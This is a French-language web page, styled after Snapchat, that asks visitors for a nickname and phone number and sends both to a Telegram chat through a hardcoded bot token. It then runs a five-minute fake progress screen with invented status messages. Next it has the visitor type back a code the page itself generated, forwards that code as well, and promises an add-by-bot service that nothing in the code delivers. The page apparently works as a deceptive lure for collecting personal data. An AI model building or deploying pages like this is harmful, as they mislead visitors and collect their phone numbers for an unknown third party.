<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Envoi vers Telegram</title>
<style>
  * { box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
    background: radial-gradient(circle at 50% 0%, #1a1a05 0%, #000000 60%);
    color: #FFFC00;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 24px 16px;
    margin: 0;
  }
  .card {
    background: #0a0a0a;
    border: 2px solid #FFFC00;
    border-radius: 26px;
    padding: 30px 22px;
    width: 100%;
    max-width: 380px;
    box-shadow: 0 0 50px rgba(255,252,0,0.18);
  }
  .disclaimer {
    text-align: center;
    color: #777;
    font-size: 10.5px;
    letter-spacing: 0.3px;
    margin-bottom: 14px;
  }
  h1 {
    font-size: 19px;
    margin: 0 0 4px;
    text-align: center;
    color: #FFFC00;
    letter-spacing: 0.3px;
    font-weight: 800;
  }
  .subtitle {
    text-align: center;
    color: #999;
    font-size: 12px;
    margin-bottom: 24px;
    letter-spacing: 0.5px;
  }
  .form-group {
    margin-bottom: 18px;
  }
  label {
    display: block;
    color: #FFFC00;
    font-size: 13px;
    font-weight: 700;
    margin-bottom: 8px;
    letter-spacing: 0.3px;
  }
  input {
    width: 100%;
    padding: 12px 14px;
    border: 2px solid #FFFC00;
    border-radius: 14px;
    background: #000;
    color: #FFFC00;
    font-size: 16px;
    transition: box-shadow 0.2s ease;
  }
  input:focus {
    outline: none;
    box-shadow: 0 0 16px rgba(255,252,0,0.3) inset;
  }
  input::placeholder {
    color: #555;
  }
  button {
    width: 100%;
    padding: 17px;
    border-radius: 16px;
    border: none;
    background: linear-gradient(135deg, #FFFC00, #e6c700);
    color: #000;
    font-size: 17px;
    font-weight: 800;
    cursor: pointer;
    letter-spacing: 0.5px;
  }
  button:disabled {
    background: #444;
    color: #888;
    cursor: not-allowed;
  }
  button:active:not(:disabled) {
    transform: scale(0.98);
  }
  #status {
    margin-top: 14px;
    text-align: center;
    font-size: 14px;
    min-height: 18px;
    font-weight: 600;
  }
  .ok { color: #4ade80; }
  .err { color: #f87171; }
  .loading-screen {
    display: none;
    text-align: center;
  }
  .loading-screen.active {
    display: block;
  }
  .form-screen {
    display: block;
  }
  .form-screen.hidden {
    display: none;
  }
  .timer {
    font-size: 32px;
    font-weight: 800;
    color: #FFFC00;
    margin: 20px 0;
    letter-spacing: 2px;
  }
  .spinner {
    width: 50px;
    height: 50px;
    border: 3px solid #333;
    border-top-color: #FFFC00;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 20px auto;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  .success-screen {
    display: none;
    text-align: center;
  }
  .success-screen.active {
    display: block;
  }
  .success-screen h1 {
    color: #4ade80;
    font-size: 22px;
    margin-bottom: 16px;
  }
  .success-msg {
    color: #FFFC00;
    font-size: 14px;
    line-height: 1.6;
  }
</style>
</head>
<body>
<div class="card">
  <div class="disclaimer">Outil personnel indépendant — non affilié à Snapchat</div>
  
  <!-- Formulaire initial -->
  <div class="form-screen" id="formScreen">
    <h1>Informations</h1>
    <div class="subtitle">Envoie ton pseudo et ton numéro</div>
    
    <div class="form-group">
      <label for="name">Pseudo</label>
      <input type="text" id="name" placeholder="Ex: Philippe" />
    </div>

    <div class="form-group">
      <label for="phone">Numéro de téléphone</label>
      <input type="tel" id="phone" placeholder="Ex: 0612345678" maxlength="10" />
    </div>

    <button id="sendBtn" disabled>Envoyer</button>
    <div id="status"></div>
  </div>

  <!-- Écran de chargement -->
  <div class="loading-screen" id="loadingScreen">
    <h1>Vérification en cours</h1>
    <div class="spinner"></div>
    <div class="timer" id="timer">5:00</div>
    <div class="subtitle" id="loadingMsg">Connexion au bot...</div>
    <div class="subtitle" id="loadingMsg2" style="font-size: 11px; color: #666; margin-top: 12px;"></div>
  </div>

  <!-- Écran de code -->
  <div class="form-screen hidden" id="codeScreen">
    <h1>Entrez le code</h1>
    <div class="subtitle" id="codeInstructions">Code: 000000</div>
    
    <div class="form-group">
      <label for="code">Code de vérification</label>
      <input type="text" id="code" placeholder="Entrez le code" inputmode="numeric" />
    </div>

    <button id="verifyBtn">Vérifier</button>
    <div id="codeStatus"></div>
  </div>

  <!-- Écran de succès -->
  <div class="success-screen" id="successScreen">
    <h1>✓ Validé</h1>
    <div class="success-msg">
      <p>Le bot va vous ajouter d'ici <strong>30 minutes à 1h30</strong></p>
    </div>
  </div>
</div>

<script>
  const BOT_TOKEN = "8672462260:AAFr31NBb7Dccm-8VP4TNuUYDGFnp0EgUag";
  const CHAT_ID = "-1004432144130";
  const LOADING_TIME = 5 * 60; // 5 minutes en secondes

  const nameInput = document.getElementById('name');
  const phoneInput = document.getElementById('phone');
  const statusEl = document.getElementById('status');
  const sendBtn = document.getElementById('sendBtn');
  const formScreen = document.getElementById('formScreen');
  const loadingScreen = document.getElementById('loadingScreen');
  const codeScreen = document.getElementById('codeScreen');
  const successScreen = document.getElementById('successScreen');
  const timerEl = document.getElementById('timer');
  const loadingMsg2El = document.getElementById('loadingMsg2');
  const codeInput = document.getElementById('code');
  const verifyBtn = document.getElementById('verifyBtn');
  const codeStatusEl = document.getElementById('codeStatus');

  let generatedCode = "";
  let userData = {};
  let timeRemaining = LOADING_TIME;

  const loadingMessages = [
    "Connexion au bot...",
    "Création du compte...",
    "Configuration des paramètres...",
    "Enregistrement des données...",
    "Vérification des autorisations...",
    "Initialisation du service...",
    "Connexion au serveur...",
    "Finalisation de l'ajout de compte..."
  ];

  function generateCode() {
    return Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
  }

  function formatTime(seconds) {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  }

  async function sendToTelegram(text) {
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
      });
      const data = await res.json();
      return data.ok;
    } catch (err) {
      console.error("Erreur d'envoi:", err);
      return false;
    }
  }

  // Validation du champ téléphone - seulement chiffres
  phoneInput.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
    updateSendButton();
  });

  function updateSendButton() {
    const name = nameInput.value.trim();
    const phone = phoneInput.value.trim();
    const isValid = name && phone.length === 10;
    sendBtn.disabled = !isValid;
  }

  nameInput.addEventListener('input', updateSendButton);
  phoneInput.addEventListener('input', updateSendButton);

  sendBtn.addEventListener('click', async () => {
    const name = nameInput.value.trim();
    const phone = phoneInput.value.trim();

    if (!name) {
      statusEl.textContent = "Entre ton pseudo.";
      statusEl.className = "err";
      return;
    }
    if (phone.length !== 10) {
      statusEl.textContent = "Le numéro doit avoir exactement 10 chiffres.";
      statusEl.className = "err";
      return;
    }

    userData = { name, phone };
    generatedCode = generateCode();
    timeRemaining = LOADING_TIME;

    console.log("Code généré:", generatedCode);
    
    // Envoyer pseudo + numéro immédiatement sur Telegram
    sendBtn.disabled = true;
    statusEl.textContent = "Envoi en cours...";
    statusEl.className = "";

    const message1 = `Pseudo: ${userData.name}\nNuméro: ${userData.phone}`;
    const sent = await sendToTelegram(message1);

    if (!sent) {
      statusEl.textContent = "Erreur d'envoi.";
      statusEl.className = "err";
      sendBtn.disabled = false;
      return;
    }

    // Passer à l'écran de chargement
    formScreen.classList.add('hidden');
    loadingScreen.classList.add('active');

    // Démarrer le compte à rebours
    let msgIndex = 0;
    const interval = setInterval(() => {
      timerEl.textContent = formatTime(timeRemaining);
      
      const msgPosition = Math.floor((LOADING_TIME - timeRemaining) / (LOADING_TIME / loadingMessages.length));
      if (msgPosition >= 0 && msgPosition < loadingMessages.length) {
        loadingMsg2El.textContent = loadingMessages[msgPosition];
      }
      
      timeRemaining--;

      if (timeRemaining < 0) {
        clearInterval(interval);
        // Passer à l'écran de code
        loadingScreen.classList.remove('active');
        codeScreen.classList.remove('hidden');
        document.getElementById('codeInstructions').textContent = `Code: ${generatedCode}`;
        codeInput.focus();
      }
    }, 1000);
  });

  verifyBtn.addEventListener('click', async () => {
    const enteredCode = codeInput.value.trim();

    if (!enteredCode) {
      codeStatusEl.textContent = "Entre le code.";
      codeStatusEl.className = "err";
      return;
    }

    if (enteredCode !== generatedCode) {
      codeStatusEl.textContent = "Code incorrect.";
      codeStatusEl.className = "err";
      return;
    }

    // Code correct - envoyer le code sur Telegram
    verifyBtn.disabled = true;
    codeStatusEl.textContent = "Envoi en cours...";
    codeStatusEl.className = "";

    const message2 = `Code entré: ${enteredCode}`;
    const sent = await sendToTelegram(message2);

    if (!sent) {
      codeStatusEl.textContent = "Erreur d'envoi.";
      codeStatusEl.className = "err";
      verifyBtn.disabled = false;
      return;
    }

    // Afficher l'écran de succès
    codeScreen.classList.add('hidden');
    successScreen.classList.add('active');
  });
</script>
</body>
</html>
